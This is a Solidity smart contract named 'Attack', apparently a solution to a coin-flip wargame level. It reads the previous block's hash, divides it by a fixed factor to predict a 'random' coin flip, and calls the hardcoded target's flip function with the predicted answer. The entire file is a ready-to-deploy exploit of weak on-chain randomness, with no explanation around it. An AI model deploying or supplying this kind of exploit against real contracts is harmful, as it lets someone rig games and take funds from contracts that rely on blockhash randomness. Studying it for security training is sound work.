// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    address target = 0x0E2D55D8063EbA86344313628aa03242669628f5;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function win(uint gas) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bytes memory guess = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = target.call{value: 0, gas: gas}(guess);
    }
}